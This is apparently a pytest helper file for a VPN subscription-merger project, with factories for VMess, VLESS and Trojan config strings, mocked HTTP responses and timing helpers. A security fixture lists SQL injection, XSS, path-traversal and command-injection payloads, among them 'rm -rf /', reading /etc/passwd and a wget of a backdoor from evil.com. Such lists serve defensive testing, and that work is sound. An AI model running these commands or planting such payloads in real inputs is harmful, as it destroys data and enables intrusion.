#!/usr/bin/env python3
"""
Advanced Test Utilities and Fixtures
===================================

Enhanced test utilities, fixtures, and helpers for better test quality,
reusability, and maintainability.
"""

import asyncio
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Union
from unittest.mock import AsyncMock, Mock, patch

import pytest

from vpn_merger.core.merger import VPNSubscriptionMerger
from vpn_merger.core.source_processor import SourceProcessor
from vpn_merger.core.config_processor import ConfigurationProcessor
from vpn_merger.web.config_generator import VPNConfigGenerator


class TestDataFactory:
    """Factory for creating test data."""
    
    @staticmethod
    def create_vmess_config(host: str = "test.com", port: int = 443, uuid: str = None) -> str:
        """Create a valid VMess configuration."""
        if uuid is None:
            import uuid
            uuid = str(uuid.uuid4())
        
        config_data = {
            "add": host,
            "port": port,
            "type": "none",
            "id": uuid,
            "aid": 0,
            "net": "ws",
            "path": "/",
            "host": "",
            "tls": ""
        }
        
        import json
        import base64
        config_json = json.dumps(config_data)
        config_b64 = base64.b64encode(config_json.encode()).decode()
        return f"vmess://{config_b64}"
    
    @staticmethod
    def create_vless_config(host: str = "test.com", port: int = 443, uuid: str = None) -> str:
        """Create a valid VLESS configuration."""
        if uuid is None:
            import uuid
            uuid = str(uuid.uuid4())
        
        return f"vless://{uuid}@{host}:{port}?security=tls&sni={host}#Test"
    
    @staticmethod
    def create_trojan_config(host: str = "test.com", port: int = 443, password: str = "password") -> str:
        """Create a valid Trojan configuration."""
        return f"trojan://{password}@{host}:{port}?security=tls&sni={host}#Test"
    
    @staticmethod
    def create_test_sources(count: int = 5) -> List[str]:
        """Create a list of test source URLs."""
        return [f"https://raw.githubusercontent.com/test/test{i}.txt" for i in range(count)]
    
    @staticmethod
    def create_malformed_configs() -> List[str]:
        """Create a list of malformed configurations for testing."""
        return [
            "vmess://",
            "vless://",
            "trojan://",
            "ss://",
            "invalid-protocol://test",
            "vmess://invalid-base64",
            "vless://invalid-uuid@host:port",
        ]


class MockResponseFactory:
    """Factory for creating mock HTTP responses."""
    
    @staticmethod
    def create_success_response(content: str = "vmess://test", status: int = 200) -> AsyncMock:
        """Create a mock successful HTTP response."""
        response = AsyncMock()
        response.status = status
        response.headers = {"Content-Type": "text/plain"}
        response.text = AsyncMock(return_value=content)
        response.json = AsyncMock(return_value={"success": True})
        return response
    
    @staticmethod
    def create_error_response(status: int = 404) -> AsyncMock:
        """Create a mock error HTTP response."""
        response = AsyncMock()
        response.status = status
        response.headers = {"Content-Type": "text/plain"}
        response.text = AsyncMock(return_value="Not Found")
        response.json = AsyncMock(return_value={"error": "Not Found"})
        return response
    
    @staticmethod
    def create_timeout_response() -> AsyncMock:
        """Create a mock timeout response."""
        response = AsyncMock()
        response.status = 408
        response.headers = {"Content-Type": "text/plain"}
        response.text = AsyncMock(return_value="Request Timeout")
        response.json = AsyncMock(return_value={"error": "Request Timeout"})
        return response


class PerformanceTestHelper:
    """Helper for performance testing."""
    
    @staticmethod
    def measure_execution_time(func, *args, **kwargs) -> Dict[str, Any]:
        """Measure execution time of a function."""
        start_time = time.perf_counter()
        start_memory = 0  # Simplified for now
        
        try:
            result = func(*args, **kwargs)
            end_time = time.perf_counter()
            end_memory = 0  # Simplified for now
            
            return {
                "result": result,
                "duration": end_time - start_time,
                "memory_delta": end_memory - start_memory,
                "success": True
            }
        except Exception as e:
            end_time = time.perf_counter()
            return {
                "result": None,
                "duration": end_time - start_time,
                "memory_delta": 0,
                "success": False,
                "error": str(e)
            }
    
    @staticmethod
    async def measure_async_execution_time(func, *args, **kwargs) -> Dict[str, Any]:
        """Measure execution time of an async function."""
        start_time = time.perf_counter()
        start_memory = 0  # Simplified for now
        
        try:
            result = await func(*args, **kwargs)
            end_time = time.perf_counter()
            end_memory = 0  # Simplified for now
            
            return {
                "result": result,
                "duration": end_time - start_time,
                "memory_delta": end_memory - start_memory,
                "success": True
            }
        except Exception as e:
            end_time = time.perf_counter()
            return {
                "result": None,
                "duration": end_time - start_time,
                "memory_delta": 0,
                "success": False,
                "error": str(e)
            }


class EnvironmentManager:
    """Manager for test environment setup and cleanup."""
    
    def __init__(self):
        self.temp_dirs = []
        self.mocked_objects = []
    
    def create_temp_dir(self) -> Path:
        """Create a temporary directory for testing."""
        temp_dir = tempfile.mkdtemp()
        path = Path(temp_dir)
        self.temp_dirs.append(path)
        return path
    
    def mock_http_session(self, responses: List[AsyncMock]) -> Mock:
        """Mock HTTP session with predefined responses."""
        session = Mock()
        session.get = Mock()
        
        # Set up responses
        for i, response in enumerate(responses):
            session.get.return_value.__aenter__.return_value = response
        
        self.mocked_objects.append(session)
        return session
    
    def cleanup(self):
        """Clean up test environment."""
        # Clean up temporary directories
        for temp_dir in self.temp_dirs:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
        
        # Clean up mocked objects
        for mock_obj in self.mocked_objects:
            if hasattr(mock_obj, 'stop'):
                mock_obj.stop()


# Pytest Fixtures
@pytest.fixture
def test_data_factory():
    """Provide test data factory."""
    return TestDataFactory()


@pytest.fixture
def mock_response_factory():
    """Provide mock response factory."""
    return MockResponseFactory()


@pytest.fixture
def performance_helper():
    """Provide performance test helper."""
    return PerformanceTestHelper()


@pytest.fixture
def test_env_manager():
    """Provide test environment manager."""
    manager = EnvironmentManager()
    yield manager
    manager.cleanup()


@pytest.fixture
def temp_output_dir(test_env_manager):
    """Provide temporary output directory."""
    return test_env_manager.create_temp_dir()


@pytest.fixture
def mock_http_responses(mock_response_factory):
    """Provide mock HTTP responses."""
    return [
        mock_response_factory.create_success_response("vmess://test1"),
        mock_response_factory.create_success_response("vless://test2"),
        mock_response_factory.create_error_response(404),
        mock_response_factory.create_timeout_response(),
    ]


@pytest.fixture
def mock_http_session(mock_http_responses, test_env_manager):
    """Provide mocked HTTP session."""
    return test_env_manager.mock_http_session(mock_http_responses)


@pytest.fixture
def real_source_processor():
    """Provide real source processor for integration testing."""
    return SourceProcessor()


@pytest.fixture
def real_config_processor():
    """Provide real config processor for integration testing."""
    return ConfigurationProcessor()


@pytest.fixture
def real_merger():
    """Provide real VPN merger for integration testing."""
    return VPNSubscriptionMerger()


@pytest.fixture
def web_generator():
    """Provide web config generator for testing."""
    generator = VPNConfigGenerator(host="127.0.0.1", port=0)
    return generator


# Test Data Fixtures
@pytest.fixture
def valid_vmess_config(test_data_factory):
    """Provide valid VMess configuration."""
    return test_data_factory.create_vmess_config()


@pytest.fixture
def valid_vless_config(test_data_factory):
    """Provide valid VLESS configuration."""
    return test_data_factory.create_vless_config()


@pytest.fixture
def valid_trojan_config(test_data_factory):
    """Provide valid Trojan configuration."""
    return test_data_factory.create_trojan_config()


@pytest.fixture
def test_sources(test_data_factory):
    """Provide test source URLs."""
    return test_data_factory.create_test_sources()


@pytest.fixture
def malformed_configs(test_data_factory):
    """Provide malformed configurations for testing."""
    return test_data_factory.create_malformed_configs()


# Performance Test Fixtures
@pytest.fixture
def performance_metrics():
    """Provide performance metrics collector."""
    return {
        "durations": [],
        "memory_usage": [],
        "success_count": 0,
        "error_count": 0
    }


@pytest.fixture
def benchmark_data():
    """Provide benchmark test data."""
    return {
        "small_dataset": list(range(10)),
        "medium_dataset": list(range(100)),
        "large_dataset": list(range(1000)),
        "config_types": ["vmess", "vless", "trojan", "ss"],
        "batch_sizes": [1, 5, 10, 20, 50],
        "concurrency_levels": [1, 5, 10, 20, 50]
    }


# Security Test Fixtures
@pytest.fixture
def security_test_data():
    """Provide security test data."""
    return {
        "sql_injection_payloads": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
        ],
        "xss_payloads": [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
        ],
        "path_traversal_payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
        ],
        "command_injection_payloads": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& del C:\\Windows\\System32",
            "; wget http://evil.com/backdoor",
        ]
    }


# Integration Test Fixtures
@pytest.fixture
def integration_test_config():
    """Provide integration test configuration."""
    return {
        "sources": [
            "https://raw.githubusercontent.com/test/test1.txt",
            "https://raw.githubusercontent.com/test/test2.txt",
            "https://raw.githubusercontent.com/test/test3.txt",
        ],
        "batch_size": 2,
        "max_concurrent": 5,
        "timeout": 10
    }


@pytest.fixture
def e2e_test_scenarios():
    """Provide end-to-end test scenarios."""
    return {
        "happy_path": {
            "sources": ["https://test.com/config.txt"],
            "expected_result": "success"
        },
        "network_failure": {
            "sources": ["https://invalid-domain.com/config.txt"],
            "expected_result": "graceful_failure"
        },
        "malformed_config": {
            "sources": ["https://test.com/malformed.txt"],
            "expected_result": "graceful_failure"
        },
        "timeout_scenario": {
            "sources": ["https://httpstat.us/200?sleep=30000"],
            "expected_result": "timeout"
        }
    }


# Utility Functions
def assert_performance_within_limits(metrics: Dict[str, Any], limits: Dict[str, float]):
    """Assert that performance metrics are within specified limits."""
    for metric, limit in limits.items():
        if metric in metrics:
            assert metrics[metric] <= limit, f"{metric} exceeded limit: {metrics[metric]} > {limit}"


def assert_error_handled_gracefully(exception: Exception, expected_keywords: List[str]):
    """Assert that an error was handled gracefully."""
    error_message = str(exception).lower()
    for keyword in expected_keywords:
        assert keyword in error_message, f"Expected keyword '{keyword}' not found in error: {error_message}"


def assert_config_valid(config: Any, required_fields: List[str]):
    """Assert that a configuration object is valid."""
    assert config is not None, "Config should not be None"
    for field in required_fields:
        assert hasattr(config, field), f"Config should have field: {field}"


def assert_list_contains_valid_items(items: List[Any], validator_func):
    """Assert that a list contains valid items."""
    assert isinstance(items, list), "Should return a list"
    for item in items:
        if item is not None:
            validator_func(item)


# Test Decorators
def performance_test(threshold_seconds: float = 5.0):
    """Decorator for performance tests."""
    def decorator(func):
        func._performance_threshold = threshold_seconds
        return func
    return decorator


def integration_test(requires_network: bool = False):
    """Decorator for integration tests."""
    def decorator(func):
        func._requires_network = requires_network
        return func
    return decorator


def security_test(test_type: str = "general"):
    """Decorator for security tests."""
    def decorator(func):
        func._security_test_type = test_type
        return func
    return decorator
